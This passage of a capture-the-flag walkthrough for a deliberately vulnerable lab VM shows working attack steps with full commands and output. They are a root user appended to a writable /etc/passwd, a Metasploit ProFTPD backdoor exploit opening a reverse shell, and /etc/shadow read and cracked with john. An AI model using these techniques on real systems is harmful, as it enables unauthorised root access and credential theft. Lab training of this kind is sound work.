  LightCyan: Users with console                                                                                                                                                               
  Blue: Users without console & mounted devs                                                                                                                                                  
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)                                                                                                              
  LightMagenta: Your username                                                                                                                                                                 
```

<p></p>
So you need to look through the output and look specifically for the RED/YELLOW text and take note of the RED text. I will only show parts of the output because of how large it is:
<p></p>
<div align="center">
<img src="https://github.com/Shadow-Admins/Cyber_Club/blob/0680f808776e5963a4fe4d6bee39e61458156a61/Starting_Point/VulnHub/BasicPentesting1/images/lin.png"><br>
</div>
<p></p>

```
╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. root:!:17484:0:99999:7:::
daemon:*:17379:0:99999:7:::
bin:*:17379:0:99999:7:::
sys:*:17379:0:99999:7:::
sync:*:17379:0:99999:7:::
games:*:17379:0:99999:7:::
man:*:17379:0:99999:7:::
lp:*:17379:0:99999:7:::
mail:*:17379:0:99999:7:::
news:*:17379:0:99999:7:::
uucp:*:17379:0:99999:7:::
proxy:*:17379:0:99999:7:::
www-data:*:17379:0:99999:7:::
backup:*:17379:0:99999:7:::
list:*:17379:0:99999:7:::
irc:*:17379:0:99999:7:::
gnats:*:17379:0:99999:7:::
nobody:*:17379:0:99999:7:::
systemd-timesync:*:17379:0:99999:7:::
systemd-network:*:17379:0:99999:7:::
systemd-resolve:*:17379:0:99999:7:::
systemd-bus-proxy:*:17379:0:99999:7:::
syslog:*:17379:0:99999:7:::
_apt:*:17379:0:99999:7:::
messagebus:*:17379:0:99999:7:::
uuidd:*:17379:0:99999:7:::
lightdm:*:17379:0:99999:7:::
whoopsie:*:17379:0:99999:7:::
avahi-autoipd:*:17379:0:99999:7:::
avahi:*:17379:0:99999:7:::
dnsmasq:*:17379:0:99999:7:::
colord:*:17379:0:99999:7:::
speech-dispatcher:!:17379:0:99999:7:::
hplip:*:17379:0:99999:7:::
kernoops:*:17379:0:99999:7:::
pulse:*:17379:0:99999:7:::
rtkit:*:17379:0:99999:7:::
saned:*:17379:0:99999:7:::
usbmux:*:17379:0:99999:7:::
marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::
mysql:!:17486:0:99999:7:::
sshd:*:17486:0:99999:7:::
```

<p></p>

```
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/etc/passwd
/run/lock
/run/lock/apache2
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory
```

<p></p>
So we can see that /etc/passwd is highly likely to be used for priv esc.
<p></p>
Since we can write to it we will create our own user we can refer to <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#passwd-shadow-files" rel="nofollow">HackTricks</a> for how to do this. To start with we need to generate a password on our attack machine we runn the following command:
<p></p>

```
openssl passwd -1 -salt hacker hacker
```

<p></p>
Which outputs:
<p></p>

```
❯ openssl passwd -1 -salt hacker hacker
$1$hacker$TzyKlv0/R/c28R.GAeLw.1
```

<p></p>
We now need to add this password to this line:
<p></p>

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

<p></p>
So we end up with:
<p></p>

```
hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash
```

<p></p>
We now need to add this to the '/etc/passwd' file on our target VM. using this command on the target machine:
<p></p>

```
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash' >> /etc/passwd
```

<p></p>
We can confirm this worked using:
<p></p>

```
tail /etc/passwd
```

<p></p>
Which outputs:
<p></p>

```
tail /etc/passwd
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
marlinspike:x:1000:1000:marlinspike,,,:/home/marlinspike:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash
```

<p></p>
Good it worked, we can now switch user to hacker and we should have a root shell.
<p></p>

```
su hacker
```

<p></p>
Enter the password 'hacker' when prompted and you should see your command line change to confirm this you can run id.
<p></p>

```
root@vtcsec:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
```

<p></p>
We have achieved root and as such the highest priveleges possible. Essentially completing this box.
<p></p>
Now as I stated at the start there are two ways to complete this box, and we just completed the exploitation using port 80, lets now go through the process of exploiting the system using port 21.
<p></p>
Refering back to our initial nmap scan we can pull some important information.
<p></p>

```
# Nmap 7.91 scan initiated Sun Jul 11 12:44:35 2021 as: nmap -e eth1 -A -vvv --script vuln -oN nmap.txt 192.168.125.135
Nmap scan report for 192.168.125.135
Host is up, received arp-response (0.0045s latency).
Scanned at 2021-07-11 12:44:45 AEST for 458s
Not shown: 997 closed ports
Reason: 997 resets
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 ProFTPD 1.3.3c
|_sslv2-drown: 
```

<p></p>
The important information we need to the ftp version, we will use this information to search 'searchsploit' to see if it is exploitable.
<p></p>

```
❯ searchsploit proftpd 1.3.3c
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
ProFTPd 1.3.3c - Compromised Source Backdoor Remote Code Execution                                                                                          | linux/remote/15662.txt
ProFTPd-1.3.3c - Backdoor Command Execution (Metasploit)                                                                                                    | linux/remote/16921.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

<p></p>
Straight away we can see a metasploit module for backdoor command execution lets start metasploit and go through using this exploit. To start msf we use the following command:
<p></p>

```
msfconsole
```

<p></p>
Which outputs (your banner will be different):
<p></p>

```
❯ msfconsole
                                                  
Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`

                             https://metasploit.com


       =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Search can apply complex filters such as 
search cve:2009 type:exploit, see all the filters 
with help search

msf6 > 
```

<p></p>
You can see we have a new command input, we now need to search for the module we found previously using the following command:
<p></p>

```
search proftpd
```

<p></p>
Which outputs:
<p></p>

```
msf6 > search proftpd

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
   1  exploit/linux/ftp/proftp_sreplace            2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   2  exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   3  exploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   4  exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution
   5  exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution


Interact with a module by name or index. For example info 5, use 5 or use exploit/unix/ftp/proftpd_133c_backdoor
```

<p></p>
We can see the module we want is number 5 enter the following command to use this module.
<p></p>

```
use 5
```

<p></p>
Our command prompt changes again, we now need to see the module options using the following command:
<p></p>

```
show options
```

<p></p>
Which outputs:
<p></p>

```
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show options

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

<p></p>
We also need to set a payload, since we know the target is a unix system we will use the 'cmd/unix/reverse' payload, to use this we enter:
<p></p>

```
set payload cmd/unix/reverse
```

<p></p>
If we run 'show options' again we can see there is now more information we need to input.
<p></p>

```
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > options

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

<p></p>
We can see that there two options we need to set (RHOSTS or the remote IP of the Target VM and LHOST our local IP), IOT do this we need to enter the following command:
<p></p>

```
set rhosts 192.168.125.135
```

<p></p>

```
set lhost 192.168.125.134
```

<p></p>
we can finally check that this input worked by again running 'show options' again.
<p></p>

```
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > options

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.125.135  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.125.134  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

<p></p>
Finally we enter 'exploit' to run the exploit.
<p></p>

```
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > exploit

[*] Started reverse TCP double handler on 192.168.125.134:4444 
[*] 192.168.125.135:21 - Sending Backdoor Command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo pa1bD2O27HMOXCqL;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "pa1bD2O27HMOXCqL\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.125.134:4444 -> 192.168.125.135:50154) at 2021-07-13 13:50:45 +1000
```

<p></p>
We can see that we now have remote access to the machine and if we run id we can see that we are now root.
<p></p>

```
id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
```

<p></p>
Again, we have achieved root access, So have achieved the outcome of the box.
<p></p>
I will now take you through one last thing which is becoming the user 'marlinspike', while this isn't the highest level of access you can get 'root' it is a process in yourself and could be helpful in other situations.
<p></p>
To start with we will need one of the shells we gained earlier (you don't need root permisions) and cat the '/etc/shadow' file
<p></p>

```
cat /etc/shadow
root:!:17484:0:99999:7:::
daemon:*:17379:0:99999:7:::
bin:*:17379:0:99999:7:::
sys:*:17379:0:99999:7:::
sync:*:17379:0:99999:7:::
games:*:17379:0:99999:7:::
man:*:17379:0:99999:7:::
lp:*:17379:0:99999:7:::
mail:*:17379:0:99999:7:::
news:*:17379:0:99999:7:::
uucp:*:17379:0:99999:7:::
proxy:*:17379:0:99999:7:::
www-data:*:17379:0:99999:7:::
backup:*:17379:0:99999:7:::
list:*:17379:0:99999:7:::
irc:*:17379:0:99999:7:::
gnats:*:17379:0:99999:7:::
nobody:*:17379:0:99999:7:::
systemd-timesync:*:17379:0:99999:7:::
systemd-network:*:17379:0:99999:7:::
systemd-resolve:*:17379:0:99999:7:::
systemd-bus-proxy:*:17379:0:99999:7:::
syslog:*:17379:0:99999:7:::
_apt:*:17379:0:99999:7:::
messagebus:*:17379:0:99999:7:::
uuidd:*:17379:0:99999:7:::
lightdm:*:17379:0:99999:7:::
whoopsie:*:17379:0:99999:7:::
avahi-autoipd:*:17379:0:99999:7:::
avahi:*:17379:0:99999:7:::
dnsmasq:*:17379:0:99999:7:::
colord:*:17379:0:99999:7:::
speech-dispatcher:!:17379:0:99999:7:::
hplip:*:17379:0:99999:7:::
kernoops:*:17379:0:99999:7:::
pulse:*:17379:0:99999:7:::
rtkit:*:17379:0:99999:7:::
saned:*:17379:0:99999:7:::
usbmux:*:17379:0:99999:7:::
marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::
mysql:!:17486:0:99999:7:::
sshd:*:17486:0:99999:7:::
```

<p></p>
We can see marlinspikes hash is present.
<p></p>

```
marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::
```

<p></p>
We need to copy this, and put it onto our attack vm in a file called hash.hash (file name doesn't matter).
<p></p>
Once we have done this we will use a program called 'john' to crack the hash using the following command.
<p></p>

```
john hash.hash
```

<p></p>
Which outputs:
<p></p>

```
❯ john hash.hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
marlinspike      (marlinspike)
1g 0:00:00:00 DONE 1/3 (2021-07-13 14:18) 25.00g/s 800.0p/s 800.0c/s 800.0C/s marlinspike..marlinspike12
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

<p></p>
We can see that we have a password returned, 'marlinspike' we can use this on the target VM to change to the user marlinspike.
<p></p>

```
su marlinspike
```

<p></p>
We can confirm this worked by running id
<p></p>

```
marlinspike@vtcsec:/$ id
id
uid=1000(marlinspike) gid=1000(marlinspike) groups=1000(marlinspike),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

<p></p>
We have successfully become the user marlinspike, but like I said this isn't the highest level of acccess we can obtain for this box.
<p></p>
This isn't the only way we can obtain this password, we can combine both the passwd and shadow files using 'unshadow' and cracking it using either john or hashcat but I won't go over that process in this walkthrough, feel free to try these methods if you want as they will work on this machine because you can read both passwd and shadow.
<p></p>
You have now completed this box, by achieving root.
<p></p>
I hope you enjoyed.



</details>